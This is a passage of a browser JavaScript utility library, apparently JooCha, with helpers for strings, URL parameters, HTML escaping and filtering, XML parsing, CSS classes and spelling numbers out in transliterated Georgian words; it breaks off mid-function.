

var SQLDateFormat="Y-m-d";

var ProjectDateFormat="d/m/Y";

var ProjectTimeFormat="H:i:s";

var ProjectDateTimeFormat="d/m/Y H:i:s";


var WeekDayStrForDate=new Array(
'Mon',
'Tue',
'Wed',
'Thu',
'Fri',
'Sat',
'Sun'
);

var MonthNamesForDate =new Array(
'January',
'February',
'March',
'April',
'May',
'June',
'July',
'August',
'September',
'October',
'November',
'December'
);
var svgNS = "http://www.w3.org/2000/svg";
var xlinkNS = "http://www.w3.org/1999/xlink";
//--------------------------------------------------------------
//--------------------------------------------------------------
//--------------------------------------------------------------

/* jc_string.js */

/**
 * js_string - JavaScript JooCha Library
 *
 * Functions collection for work to strings 
 * 
 * @link    http://joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.0.1
 *
 * See usage examples at http://joocha.com/examples
 */

function intval(v)
{
  return parseInt(v);
}
//---------------------------------------------------------------------------
function floatval(v)
{
  return parseFloat(v);
}
//-------------------
function str2Int(v)
{
   var ret=0;
   if(!v)return parseInt(ret);
   var r=String(v).match(/[\-0-9]+/i);
   if(!r)return parseInt(0);
   return parseInt(r[0]);
}
//-------------------
function str2Float(v)
{
   var ret=0.0;
   if(!v)return parseFloat(ret);
   var r=String(v).match(/[\-0-9\.]+/i);
   if(!r)return parseFloat(0);
   return parseFloat(r[0]);
}
//---------------------------------------------------------------------------
function strlen(str) 
{
  return String(str).length;
}
//---------------------------------------------------------------------------
function ltrim(string,chars)
{
	string=string?String(string):"";
	chars=chars||" \t\n\r";
	var pos=0;
	while(chars.indexOf(string.charAt(pos))>=0&&(pos<=string.length)){pos++};
	return string.substr(pos);
}
//---------------------------------------------------------------------------
function rtrim(string,chars)
{
	string=string?String(string):"";
	chars=chars||" \t\n\r";
	var pos=string.length-1;
	while(chars.indexOf(string.charAt(pos))>=0&&(pos>=0)){pos--};
return string.substring(0,pos+1);
}
//---------------------------------------------------------------------------
function trim(string,chars)
{
	chars=chars||" \t\n\r";
	return ltrim(rtrim(string,chars),chars);
}
//---------------------------------------------------------------------------
function URLToArray(urlpars)
{
var itms=String(urlpars).split('?');
if(itms.length>1)urlpars=itms[itms.length-1];

var ret=new Array();
urlpars=String(urlpars).split("&");
for(var ky in urlpars)
if(typeof(urlpars[ky]) != "function")
{
   var vl=urlpars[ky];
   vl=String(vl).split("=");
   ret[trim(vl[0]," =&")]=trim(vl[1]," =&");
}
return ret;
}
//---------------------------------------------
function URLSumArray(urlpars)
{
var ret=new Array();
urlpars=String(urlpars).split("&");
for(var ky in urlpars)
if(typeof(urlpars[ky]) != "function")
{
   var vl=urlpars[ky];
   vl=String(vl).split("=");
   var vvv=trim(vl[1]," =&");
   var kkk=trim(vl[0]," =&");
   var v2=ret[kkk];
   switch(vvv.charAt(0))
   {
	case '+':ret[kkk]=parseFloat(v2) + parseFloat(vvv.substring(1));break;
	case '-':ret[kkk]=parseFloat(v2) + (parseFloat(vvv.substring(1)));break;
	case '*':ret[kkk]=parseFloat(v2) * parseFloat(vvv.substring(1));break;
	case '/':ret[kkk]=parseFloat(v2) / parseFloat(vvv.substring(1));break;
	case '%':ret[kkk]=parseFloat(v2) % parseFloat(vvv.substring(1));break;
	case '.':ret[kkk]=v2+vvv.substring(1);break;
   default:ret[trim(vl[0]," =&")]=trim(vl[1]," =&");
   }
   
}
return ret;
}
//---------------------------------------------
function reloadPage( param ){
    var url = window.location.href;
    if(param)url += ((url.indexOf('?') > -1?"&":"?") + param);
    window.location.href = url;
}
//---------------------------------------------
function loadPage(url){
    window.location.href = url;
}
//---------------------------------------------
function ArrayToURL(arr,removenull)
{
    if(!removenull)removenull=1;

	var ret="";
	for(var ky in arr)
	if(typeof(arr[ky]) != "function")
	{
		var vl=arr[ky];
		if((removenull && vl) || (!removenull))
		{
			ret+="&"+ky+"="+encodeURIComponent(vl);
		}
	}
return trim(ret,"&");
}

//---------------------------------------------------------------------------
function getLinkEx(lnk,removenull,URLSum)
{
   var itms=String(lnk).split('?');
   var dp=lnk;
   var yes=0;
   var befLnk="";
   if(itms.length>1)
   {
       yes=1;
       befLnk=trim(itms[0],' ?')+'?';
       dp=trim(itms[1],'?');
   }else {
	befLnk=trim(itms[0],' ?')+'?';
  }
   
   if(URLSum)itms=URLSumArray(dp);
   else itms=URLToArray(dp);

   ret=ArrayToURL(itms,removenull);
   
   return (befLnk+ret);
}
//---------------------------------------------------------------------------
function jsLinkEx(lnk,removenull)
{
return getLinkEx(lnk,removenull);
}
//---------------------------------------------------------------------------
function substr(str,frm,len)
{
   if(!frm)frm=0;
   return String(str).substring(frm,frm+(len || 1000));
}
//---------------------------------------------------------------------------
function strpos (haystack, needle, offset) 
{
  var str=String(haystack).trim();
  var i = str.indexOf(needle, (offset || 0));
  return i === -1 ? false : i;
}
//---------------------------------------------------------------------------
function escapeHtml(html)
{
    var text = document.createTextNode(html);
    var div = document.createElement('div');
    div.appendChild(text);
    return div.innerHTML;
}
//---------------------------------------------------------------------------
function escapeHtmlRegExp(unsafe) {
  return unsafe.replace(/[&<"']/g, function(m) {
    switch (m) {
      case '&':
        return '&amp;';
      case '<':
        return '&lt;';
      case '"':
        return '&quot;';
      default:
        return '&#039;';
    }
  });
};

//---------------------------------------------------
function HtmlDecode(s) {
  /*var y = document.createElement('textarea');
  y.innerHTML = input;
  return y.value;*/
  c = {'&lt;':'<', '&gt;':'>', '&amp;':'&', '&quot;':'"', '&#039;':"'",'&#035;':'#' };
  if(s==undefined)console.log("HtmlDecode: s is undefined");
  return s.replace( /(\&lt\;?|\&gt\;?|\&amp\;?|\&quot\;?|\&\#039\;?|\&\#035\;?)/g, function(s) {if(s==undefined)return ""; return c[s]; } );  
}
//---------------------------------------------------
function htmlspecialchars(val,par)
{
	return HtmlDecode(val);
}
//---------------------------------------------------
function HtmlEncode(s)
{
  c = {'<':'&lt;', '>':'&gt;', '&':'&amp;', '"':'&quot;', "'":'&#039;',
       '#':'&#035;' };
  if(s==undefined)console.log("HtmlEncode: s is undefined");
  return s.replace( /[<&>'"#]/g, function(s) {if(s==undefined)return ""; return c[s]; } );
}

//---------------------------------------------------------------------------
//---------------------------------------------------------------------------
/*function roundNumber(number, digits) //arascorad amrgvalebs, 1163.735 = 1163.74, xolo amrgvalebs 1163.73;
{
    var multiple = Math.pow(10, digits);
	var gamkofi=((Math.floor(number * multiple*10))-(Math.floor(number * multiple)*10));
console.log('roundman: '+number+'*'+multiple+'*'+10+'='+(Math.floor(number * multiple*10)));
	var dam=0;
	if(gamkofi>=5)dam=1;

    var rndedNum = (Math.floor(number * multiple)+dam)/ multiple;
    return rndedNum;//1163.735 - 1163730  1163735
}
//---------------------------------------------------------------------------
function roundNumber( value, round )//1638.4049 unda daamrgvalos 1638.40 amrgvalebs 1638.41 
{
     if(!round)round=2;
     round = parseInt(round) + 1;
     var p = Math.pow( 10, round );
     var r = Number( parseFloat( Math.round( value * p ) / p ) ).toFixed( round );
     if(r.length >= round + 2 && parseInt(r[r.length - 1]) == 5)
     {
      r = parseFloat(r) + 1/p;
     }
     round--;
     return parseFloat(parseFloat(r).toFixed( round ));
}*/
//---------------------------------------------------------------------------
//arascorad amrgvalebs, 1163.735 = 1163.74, xolo amrgvalebs 1163.73;
//1638.4049 unda daamrgvalos 1638.40 amrgvalebs 1638.41 
function roundNumber( value, round )
{
     if(!round)round=2;
	 var r, p = Math.pow( 10, round );
	 var Nmb,Mteli,Ciladi,Ciladi2,Ciladi3,Gamkofi;
	 
	 Nmb=String(value).split(".");
	 Mteli=Nmb[0] || 0;
	 Ciladi=Nmb[1] || "0";
	 Ciladi2=Ciladi.substr(0,round) || "0";
	 Ciladi3=Ciladi.substr(round) || "0";
	 
	 Gamkofi=parseFloat(String("0."+Ciladi3));
	 
	 r=parseFloat(Mteli+"."+Ciladi2);
	 if(Gamkofi>=0.50000)
	 {
	    if(parseFloat(value)>=0)
			r = r + 1/p;
		else
			r = r - 1/p;
	 }
	 
     return parseFloat(parseFloat(r).toFixed(round));
}
//---------------------------------------------------------------------------
function isNumber(n) {
  //return !isNaN(parseFloat(n)) && isFinite(n);
   return parseFloat(n)==n;
}
//---------------------------------------------------------------------------
var GlobMeatedebi=new Array("","meaTedi","measedi","meaTasedi","meaTiaTasedi","...","...","...","...","...");
var GlobIntVarr1=new Array("noli","erTi","ori","sami","oTxi","xuTi","eqvsi","Svidi","rva","cxra","aTi","TerTmeti","Tormeti","cameti","ToTxmeti","TxuTmeti","Teqsvsmeti","Cvidmeti","Tvrameti","cxrameti");
var GlobIntVfstly=new Array('0','1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19');
var GlobIntVarr2=new Array("","oci","ormoci","samoci","oTxmoci");
var GlobIntVarr22=new Array("","ocda","ormocda","samocda","oTxmocda");
var GlobIntVarr3=new Array("","asi","orasi","samasi","oTxasi","xuTasi","eqvsasi","Svidasi","rvaasi","cxraasi","aTasi");
var GlobIntVarr33=new Array("","as","oras","samas","oTxas","xuTas","eqvsas","Svidas","rvaas","cxraas","aTas");
var GlobIntVarrmil=new Array("","aTasi","milioni","miliardi","trilioni","siqsilioni","...","...","...","...","...","...","...","...");
var GlobIntVarrmill=new Array("","aTas","milion","miliard","trilion","siqsilion","...","...","...","...","...","...","...","...");
var GlobIntVErti="erTi";
var GlobIntVNoli="noli";
//---------------------------------------------------------------------------
function NumberToStringText(ppk,mteli,money,Da,tetri)
{
if(!mteli)mteli='{MTELI}';
if(!money)money='{MONEY}';
if(!Da)Da="da ";
if(!tetri)tetri='';
MPntSub=GlobMeatedebi;

var RetNumb="";
var ppp="";

var Numb=String(ppk);
var Frst="";
var Prst="";
var NumbStr="";
var ps;

Frst=NumbStr=Numb;


if((ps=strpos(NumbStr,"."))>0){Frst=substr(NumbStr,0,ps);Prst=substr(NumbStr,ps+1);}
Frst=trim(Frst," \n\r\t\.,");
Prst=trim(Prst," \n\r\t\.,");
if(strlen(Prst)==1 && tetri)Prst+="0";

if(strlen(Frst)>0)RetNumb=IntegerToStringText(Frst);
if(strlen(Prst)>0)ppp=IntegerToStringText(Prst);

RetNumb=trim(RetNumb," \n\r\t\.,")+mteli;// lari
ppp=trim(ppp," \n\r\t\.,");
if((strlen(ppp)>0)&&(substr(trim(ppp," \n\r\t\.,"),0,4)!=GlobIntVNoli))RetNumb=RetNumb+Da+ppp+tetri;
return RetNumb+money;
};
//---------------------------------------------------------------------------
function IntegerToStringText(pinnmb)
{
var innmb=String(pinnmb);
var arr1=GlobIntVarr1;
var fstly=GlobIntVfstly;
var arr2=GlobIntVarr2;
var arr22=GlobIntVarr22;
var arr3=GlobIntVarr3;
var arr33=GlobIntVarr33;
var arrmil=GlobIntVarrmil;
var arrmill=GlobIntVarrmill;
var RetNumb="";
var Parfirst=true;
var Frst=innmb;
var FrstA=String(Frst).split("");
var num333;

   if(innmb=="")RetNumb=arr1[0];
   else
   {
   if(strlen(Frst)>0)
   {
	  num333="";
	  Mill=0;
	  num333="";

	  for(k=strlen(Frst)-1;k>=0;k-=3)
	  {
	  
		  pos2=0;pos1=0;
		  if(k>0)
		  switch(FrstA[k-1])
		  {
			case '0':pos2=0;pos1=0;break;
			case '1':pos2=0;pos1=1;break;
			case '2':pos2=1;pos1=0;break;
			case '3':pos2=1;pos1=1;break;
			case '4':pos2=2;pos1=0;break;
			case '5':pos2=2;pos1=1;break;
			case '6':pos2=3;pos1=0;break;
			case '7':pos2=3;pos1=1;break;
			case '8':pos2=4;pos1=0;break;
			case '9':pos2=4;pos1=1;break;
		  }

		  switch(FrstA[k])
		  {
			 case '0':
					 if(pos1)num333=arr22[pos2]+arr1[10];else num333=arr2[pos2];
					 break;
			 default:
					 if(pos1)num333=arr22[pos2]+arr1[intval(FrstA[k])+10];else num333=arr22[pos2]+arr1[intval(FrstA[k])];
		  };

		  if(k>1)
		  {
			 if((strlen(num333)==0)&&(intval(FrstA[k-2])>0))
			 {
				num333=arr3[intval(FrstA[k-2])];
			 }
			 else
			    num333=arr33[intval(FrstA[k-2])]+num333;
		  };


		  if(num333)
		  {
			  if(Parfirst)
				  RetNumb=arrmil[Mill];
			  else
				  RetNumb=arrmill[Mill]+" "+RetNumb;
			  if(num333!=GlobIntVErti)RetNumb=num333+" "+RetNumb;
			  Parfirst=false;
		  };
		  Mill++;
		  num333="";
	  };
   }
   };
return RetNumb;
};
//-------------------------------------------
function getClassName(el){
	if((!el) || (el==undefined))return;
	return (typeof(el.className)=="string"?el.className:(typeof(el.getAttribute)=="function"?el.getAttribute("class"):null));
}
//-------------------------------------------
function setClassName(el,cls){
	if((!el) || (el==undefined))return;
	if(typeof(el.className)=="string")el.className=cls;
	else if(typeof(el.setAttribute)=="function")el.setAttribute("class",cls);
}

//-------------------------------------------
function addClass(el, cn) {
	if((!el) || (el==undefined))return;
	if((!cn) || (cn==undefined) || (trim(cn)==''))return;
    if(el && el.classList){cn=cn.split(" ");for(var i=0;i<cn.length;i++)el.classList.add(cn[i]);return true;}
	var cls=getClassName(el);
    var c0 = (" " + cls + " ").replace(/\s+/g, " "),
        c1 = (" " + cn + " ").replace(/\s+/g, " ");
    if (c0.indexOf(c1) < 0) {
		cls=(c0 + c1).replace(/\s+/g, " ").replace(/^ | $/g, "");
		setClassName(el,cls);
    }
	return true;
}
//-------------------------------------------
function delClass(el, cn) {
	if((!el) || (el==undefined))return;
	if((!cn) || (cn==undefined) || (trim(cn)==''))return;
    if(el && el.classList){cn=cn.split(" ");for(var i=0;i<cn.length;i++)el.classList.remove(cn[i]);return true;}
	var cls=getClassName(el);
    var c0 = (" " + cls + " ").replace(/\s+/g, " "),
        c1 = (" " + cn + " ").replace(/\s+/g, " ");
    if (c0.indexOf(c1) >= 0) {
        cls = c0.replace(c1, " ").replace(/\s+/g, " ").replace(/^ | $/g, "");
		setClassName(el,cls);
    }
	return true;
}
//-------------------------------------------
function checkClass(el, cn) {
  return el.classList.contains(cn);
}
//-------------------------------------------
function setMessage(msg,cls,cmd){
    if(!cls)cls="messageBar";
	var els=document.getElementsByClassName(cls);
	for(var i=0;i<els.length;i++){els[i].innerHTML=msg;var style=els[i].style; try{eval(cmd);}catch(e){}; }
}
//-------------------------------------------
function changeClass(el,oldCls,nwCls){
	delClass(el,oldCls);
	addClass(el,nwCls);
//el.className.replace( /(?:^|\s)MyClass(?!\S)/g , nwCls );
}
//-------------------------------------------
function changeTag(el,newTag){
	var d = document.createElement(newTag);
	var ky,vl;
	Object.assign(d,el);

	/*input_ის და textarea ველების კონვერტირება*/
	if(["input","textarea"].indexOf(el.tagName.toLowerCase())>=0){
		if(["input","textarea"].indexOf(newTag.toLowerCase())>=0)
			d.value=el.value;
		else
			d.innerHTML=el.value;
	}
	else{
		if(["input","textarea"].indexOf(newTag.toLowerCase())>=0)
			d.value=el.innerHTML;
	}
			
	/*select ელემენტის კონვერტირება*/
	if(["select"].indexOf(el.tagName.toLowerCase())>=0){
		if(["select"].indexOf(newTag.toLowerCase())>=0)
			d.value=el.value;
		else
		{
			try{
				d.innerHTML=el.selectedOptions[0].innerHTML;
			}catch(e){
				d.innerHTML=el.options[el.selectedIndex].innerHTML;
			}
		}
	}
	else{
		if(["select"].indexOf(newTag.toLowerCase())>=0){
			var i;
			for(i=0;i<d.options.length;i++){
				if(d.options[i].innerHTML==el.innerHTML){d.value=i;break;}
			}
			if(i>=d.options.length)d.value=el.innerHTML;
		}else
			d.innerHTML=el.innerHTML;
	}
			
			
	/*შეცვლილ ელემენტზე ატრიბუტების და ევენტებით გადმოტანა*/
	try{
		for(var ky=0;ky<el.attributes.length;ky++)
		{
			var nm=el.attributes[ky].name;
			d.setAttribute(nm,el.getAttribute(nm));
		}
	}catch(e){console.log(e);}
	
	if(el.id in GlobalEventList)
	try{
		var pointer=GlobalEventList[el.id];
		for(var ev in GlobalEventList[el.id])
		if(ev in GlobalEventList[el.id] && GlobalEventList[el.id][ev]["function"]){
			AddEventOnObject(d,ev,GlobalEventList[el.id][ev]["function"]);
		}
		
	}catch(e){console.log(e);}

	var parent=el.parentNode || el.parentElement;
	if(parent)
	{
		try{
			parent.insertBefore(d, el);
			parent.removeChild(el);
		}catch(e){console.log(e);}
	}
	return d;
}
//---------------------------------------
function getObjectStyle(o)
{
	var computedStyle=null;
	if (window.getComputedStyle) {
		if((o.nodeType || 1)==1)
			computedStyle = getComputedStyle(o, null);
	} else {
		computedStyle = o.currentStyle
	}
	if(!computedStyle)computedStyle={};

	return computedStyle;
}
//-----------------------------------
function getObjectStyleValue(o,stl){
   var inlineStyle=getObjectStyle(o);
   if(inlineStyle)return inlineStyle[stl];
   return null;
}
//-----------------------------------
function htmlPrintPreparing(o,first){

	if(first && o.getElementsByClassName)
	{
		var els=o.getElementsByClassName("noprint");
		for(var i=els.length-1;i>=0;i--)RemoveObjectEx(els[i]);
	}
	if(o.childNodes)
	{
		for(var i=0;i<o.childNodes.length;i++)
		if(o.childNodes[i] && typeof(o.childNodes[i])=="object"){
			htmlPrintPreparing(o.childNodes[i]);
		}
	}

	try{
		var tagName=o.tagName || o.nodeName;
		tagName=String(tagName).toLowerCase();
		//console.log(tagName+": "+o.className);
		if(["input","textarea","select"].indexOf(tagName)>=0)
		{
			changeTag(o,"div");
		}

		if(["div","span"].indexOf(tagName)>=0)
		{
			var val=getObjectStyleValue(o,"display");
			//console.log(val+" "+tagName+": "+o.className);
			switch(val)
			{
				case "inline":
				case "inline-block":
					if(["div"].indexOf(tagName)>=0)
					{
						//console.log("xchg:"+o.className);
						changeTag(o,"span");
					}
					break;
				case "block":
					if(["span"].indexOf(tagName)>=0)
						changeTag(o,"div");
					break;
				case "table":changeTag(o,"table");break;
				case "table-row":changeTag(o,"tr");break;
				case "table-cell":changeTag(o,"td");break;
				case "table-header-group":changeTag(o,"thead");break;
				case "table-body-group":changeTag(o,"tbody");break;
				case "table-footer-group":changeTag(o,"tfoot");break;
				//default:console.log(val);
			}
			val=getObjectStyleValue(o,"opacity");
			if(val!=1){
				o.style.display="none";
				RemoveObjectEx(o);
			}
			
		}
		else
		{
			//console.log(o)
		}
	}catch(e){console.log("eHPP: "+e);}
	
}
//-----------------------------------
function json2html(jdata,jtagName){
	if(!jdata)return "";
	var jhtml;
	if((!jtagName) || (jtagName==undefined))jtagName="div";
	if((jdata.tagName && jdata.tagName.length>0))jhtml=document.createElement(jdata.tagName);
	else jhtml=document.createElement((isNumber(jtagName)?"div":jtagName));
		
	
	for(var ky in jdata){
		if(ky=="attributes"){
			for(var atr in jdata[ky]){
				jhtml.setAttribute(atr,jdata[ky][atr]);
			}
		}else
		if(ky=="innerHTML"){
			jhtml.innerHTML=jdata[ky];
		}else
		if((typeof jdata[ky])=="object" && jdata[ky].childNodes && jdata[ky].childNodes!=undefined){
			jhtml.appendChild(json2html(jdata[ky].childNodes));
		}else
		if((typeof jdata[ky])=="object"){
			jhtml.appendChild(json2html(jdata[ky],ky));
		}else
		{
			var nb=document.createElement((isNumber(ky)?"div":ky));
			nb.innerHTML=jdata[ky];
			jhtml.appendChild(nb);
		}
	}
	
return jhtml;	
}
function jsontohtml(){return json2html();};
//-----------------------------------
function clearContent(obj){
	if(typeof obj=="string")obj = document.getElementById(obj);
	while(obj.firstChild){
		obj.removeChild(obj.firstChild);
	}
}
//-----------------------------------

/* jc_allbrowsers.js */

/**
 * js_allbrowsers - JavaScript JooCha Library
 *
 * Functions collection for work to all browsers. script use only JooCha Engine
 * 
 * @link    http://joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.0.2
 *
 * See usage examples at http://joocha.com/examples
 */
 
       var EFF=(navigator.appName=='Microsoft Internet Explorer');
	   var COOKIE_POLICY_ACCEPTANCE=getCookie("cookie_policy_acceptance")
       var jc_userAgent=navigator.userAgent.toLowerCase();
       var jc_appName=navigator.appName.toLowerCase();

       var BrowserType=1,BrowserTypeIdx='IE';
       if(jc_appName=='opera'){BrowserType=2;BrowserTypeIdx='OP';}
       if(jc_appName=='netscape'){BrowserType=3;BrowserTypeIdx='NS';}
       if(jc_userAgent.indexOf("chrome")+1){BrowserType=4;BrowserTypeIdx='CH';}
       if(jc_userAgent.indexOf("firefox")+1){BrowserType=5;BrowserTypeIdx='FF';}
//-------------------------------------------------	   
//------- PROTOTYPEs ------------------------------------------	   
//-------------------------------------------------
Array.prototype.clear = function() 
{
  if(this.splice) this.splice(0, this.length);
};	   
//-------------------------------------------------
function jcLog(Msg)
{
	try{
		if(console)console.log(Msg);
	}catch(e)
	{
		alert(Msg);
	}
}
//-------------------------------------------------
function isElementVisible(el) {
    var rect     = el.getBoundingClientRect(),
        vWidth   = window.innerWidth || doc.documentElement.clientWidth,
        vHeight  = window.innerHeight || doc.documentElement.clientHeight,
        efp      = function (x, y) { return document.elementFromPoint(x, y) };     

    // Return false if it's not in the viewport
    if (rect.right < 0 || rect.bottom < 0 
            || rect.left > vWidth || rect.top > vHeight)
        return false;

    // Return true if any of its four corners are visible
    return (
          el.contains(efp(rect.left,  rect.top))
      ||  el.contains(efp(rect.right, rect.top))
      ||  el.contains(efp(rect.right, rect.bottom))
      ||  el.contains(efp(rect.left,  rect.bottom))
    );
}
//-------------------------------------------------
function copyToClipboard(data)
{

    if(window.clipboardData)
    {
		try{
			window.clipboardData.setData("Text",data);
		}catch(e)
		{
			console.log("Error clipboard setData: "+e);
		}

	}else
    {
		var ta=document.createElement("textarea");
		ta.id="a"+Date.now();
		ta.style.position="absolute";
		ta.style.display="inline-block";
		
		ta.style.left="-10px";
		ta.style.top="-10px";
		ta.style.width="0px";
		ta.style.height="0px";
		
		document.body.appendChild(ta);
		ta.value=data;
		ta.focus();
		ta.select();
		try {
			var successful = document.execCommand('copy');
			var msg = (successful ? 'successful' : 'unsuccessful');
			//console.log('Copy command was ' + msg);
		}
		catch (err) {
			console.log('Oops, unable to copy');
		}
		RemoveObjectEx(ta);
    }
        
return false;
}
//------------------------------------------------------------------------------
//-------- FUNCTION XML ----------------------------------------------------------------------
//------------------------------------------------------------------------------
function XMLFromString(txt)
{
	var xmlDoc;
	var ck=true;
	if(!txt) return null;

	if (window.DOMParser)
	{
		try{
			parser=new DOMParser();
			xmlDoc=parser.parseFromString(txt,"text/xml");
			ck=false;
		}catch(e)
		{
			ck=true;
		}
	}
	if(ck) // Internet Explorer
	{
		xmlDoc=new ActiveXObject("Microsoft.XMLDOM");
		xmlDoc.async=false;
		xmlDoc.loadXML(txt);
	} 
	if(xmlDoc && xmlDoc.getElementsByTagName('parsererror').length>0)
	{
	    //error
	}
	return xmlDoc;
}
//------------------------------------------------------------------------------
function XMLErrno(xmlDom)
{
	if(xmlDom && xmlDom.getElementsByTagName('parsererror').length>0)
	{
	    return -1;
	}
return '0';
}
//------------------------------------------------------------------------------
function XMLError(xmlDom)
{
    var v;
	if(xmlDom && (v=xmlDom.getElementsByTagName('parsererror')).length>0)
	{
	    return v[0].innerHTML || v[0].childNodes[0].nodeValue || 'Parser Error';
	}
return '';
}

//-----------------------------------------------------------------------------
function XMLElementByTag(dxml,tagnm,idx)//Modis tviton TAG Elementi
{
   var ret='';
   if (!idx) idx=0;
   if(dxml && dxml.getElementsByTagName)
   {
       ret=dxml.getElementsByTagName(tagnm);
	   if(ret && ret[idx])
	   {
			ret=ret[idx];
	   }
   }
   return ret;
}
//----------------------------------------------------
function XMLNodeByTag(dxml,tagnm,idx)//Modis Tag Elementis Child, dzveli saxeli XMLGetElementByTag
{
   var ret=XMLElementByTag(dxml,tagnm,idx);
   if(ret && ret.childNodes && ret.childNodes[0])return ret.childNodes[0];
   return ret;
}
//------------------------------------------------------------------------------
function XMLGetNodeValue(dxml,tagnm,idx)//childnode-idan value-s migeba. dzveli saxeli, XMLGetNodeValue, Large Values migeba;
{
   var ret='';
   if(tagnm)
   {
		var dxml2=XMLElementByTag(dxml,tagnm,0);
		if(dxml2)dxml=dxml2;
   }
   if(dxml && dxml.childNodes && dxml.childNodes.length)
   {
		if(idx && dxml.childNodes.length>idx)
		{
			if(dxml.childNodes[idx].nodeValue)ret+=dxml.childNodes[idx].nodeValue;
			else 
			if(dxml.childNodes[idx].value)ret+=dxml.childNodes[idx].value;
		}
		else
		{
			for(var i=0;i<dxml.childNodes.length;i++)
			if(dxml.childNodes[i].nodeValue)ret+=dxml.childNodes[i].nodeValue;
			else 
			if(dxml.childNodes[i].value)ret+=dxml.childNodes[i].value;
		}
   }
   return ret;
}
//------------------------------------------------------------------------------
function XMLElementValue(dxml,tagnm,idx)
{
   var ret=XMLGetNodeValue(dxml,tagnm,idx);
   return ret;
}

//------------------------------------------------------------------------------

function getInnerText(obj,htmldec)
{
  var vr=obj.innerText || obj.innerHTML.replace(/<[^>]+>/g,"");
  if(htmldec)return HtmlDecode(vr);
  return vr;
}
//------------------------------------------------------------------------------
function getInnerTextFromString(str,htmldec)
{
  var vr=str.replace(/<[^>]+>/g,"");
  if(htmldec)return HtmlDecode(vr);
  return vr;
}

//---------------------------------------------------
var StandardTags=new Array("DIV","FONT","TABLE","TR","TD","BR","P","IMG","A","H","I","U","B","BUTTON","INPUT","EM","EMBED","OBJECT","FIELDSET","LEGEND","LI","MENU","LISTING","MARQUEE","OL","PRE","SELECT","OPTION","STRONG","TBODY","TFOOT","TEXTAREA","AREA","UL","STYLE");
var StandardTagsChanger=0;
//---------------------------------------------------
function ResetStandard1()
{
    StandardTags=new Array("DIV","FONT","TABLE","TR","TD","BR","P","IMG","A","H","I","U","B","BUTTON","INPUT","EM","EMBED","OBJECT","FIELDSET","LEGEND","LI","MENU","LISTING","MARQUEE","OL","PRE","SELECT","OPTION","STRONG","TBODY","TFOOT","TEXTAREA","AREA","UL","STYLE");
}
//----------------------------------------------------
function OF_Alpha(oDiv,opc)
{
if((!oDiv.style)||(oDiv.style=='undefined'))oDiv=document.getElementById(oDiv);
var a=Math.round(Math.max(0,100-opc*100));
if(a>100)a=100;if(a<0)a=0;
switch(BrowserType)
{
   case 1:oDiv.style.filter='alpha(opacity='+parseInt(a)+'); ';break;
   case 2:
   {
      oDiv.style.opacity=parseFloat(a/100);
      oDiv.style.filter='alpha(opacity='+parseInt(a)+'); ';
   }
   break;

default:
try
   {
      oDiv.style.opacity=parseFloat(a/100);
   }
catch(e)
   {
      oDiv.style.filter='alpha(opacity='+parseInt(a)+'); ';
   }
}

}
//---------------------------------------------------
function getInnerHTMLStandard1(obj,tagss)
{
if(!tagss)
{
   tagss=StandardTags;
   if(StandardTagsChanger)tagss=StandardTagsChanger;
}
  var res="";

  for(var i=0;i<tagss.length;i++) 
  if(tagss[i])
  {
      if(res!="")res=res+"|";
      tagss[i]=tagss[i].toUpperCase();
      res=res+tagss[i]+"|\\/"+tagss[i]+"|"+tagss[i].toLowerCase()+"|\\/"+tagss[i].toLowerCase();
  }; 
  res="<(?!"+res+")[\s]*[^>]+>";

  var regex = new RegExp(res,"gi");

  var vr=obj;
  if(obj)if(obj.innerHTML)vr=obj.innerHTML;
//alert(vr);
try{
  vr=vr.replace(regex,"");
}
catch(e){vr="";}
//(/<(?!SPAN|\/SPAN|DIV|\/DIV|FONT|\/FONT)[^>]+>/g,"");

//  vr=vr.replace("/<\S*[\s]*[^>]+></\1>/g","");
  return vr;
}
//---------------------------------------------------
function removeTagsWithContent(content,tg)
{
	var removeTags = new RegExp("<"+tg+"([^'\"]|\"(\\\\.|[^\"\\\\])*\"|'(\\\\.|[^'\\\\])*')*?<\\/"+tg+">","gi");

	while (removeTags.test(content)) {
		content = content.replace(removeTags, "");
	}
	
	return content;
}
//---------------------------------------------------
function removeCommentsWithContent(content)
{
	var removeTags = new RegExp("<\!\-\-([^'\"]|\"(\\\\.|[^\"\\\\])*\"|'(\\\\.|[^'\\\\])*')*?\-\->","gi");

	while (removeTags.test(content)) {
		content = content.replace(removeTags, "");
	}
	
	return content;
}

//---------------------------------------------------
function removeTagsAlone(content,tg)
{
	var removeTags = new RegExp('<(/)*('+tg+')(.*?)>','gi');

	while (removeTags.test(content)) {
		content = content.replace(removeTags, "");
	}
	
	return content;
}
//---------------------------------------------------
function HTMLFilter(htmlcode,tagss,remlist,alonList)
{
if(!tagss)
{
   tagss=StandardTags;
   if(StandardTagsChanger)tagss=StandardTagsChanger;
}
/*  var res="\r\n\r\n";

  for(var i=0;i<tagss.length;i++) 
  if(tagss[i])
  {
      if(res!="")res=res+"|";
      tagss[i]=tagss[i].toUpperCase();
      res=res+tagss[i]+"|\\/"+tagss[i];//+"|"+tagss[i].toLowerCase()+"|\\/"+tagss[i].toLowerCase();
  }; 
  res="<(?!"+res+")[\s]*[^>]+>";

  var regex = new RegExp(res,"gim");
*/
  var vr=htmlcode;
  if(typeof htmlcode == "object")if(htmlcode.innerHTML)vr=htmlcode.innerHTML;

  vr=removeCommentsWithContent(vr);
  
//tegebi romlebic tavis kontentianad ishleba  
if(!remlist)remlist=['xml','script','object','o:','st1:','style'];
for(var i=0;i<remlist.length;i++){
	vr=removeTagsWithContent(vr,remlist[i]);
}

if(!alonList)alonList=['meta','link'];
for(var i=0;i<alonList.length;i++){
	vr=removeTagsAlone(vr,alonList[i]);
}


  return trim(vr);
}
//---------------------------------------------------
function cleanWordContent(wordContent)
{
 return HTMLFilter(wordContent);

}
//---------------------------------------------------
function isObjectVisibility(obj,tcnt)
{
if(document.getElementById(obj))obj=document.getElementById(obj);
  if(!tcnt)tcnt=3;
  var pob=obj;
  while(pob)
  {
    try{if(pob.style.visibility=='hidden')return false;
    }catch(e){}
    pob=pob.offsetParent;
    tcnt--;
    if(tcnt<=0)break;
  }
return true;
}
//---------------------------------------------------
function isObjectDisplay(obj,tcnt)
{
if(document.getElementById(obj))obj=document.getElementById(obj);
  if(!tcnt)tcnt=3;
  var pob=obj;
  while(pob)
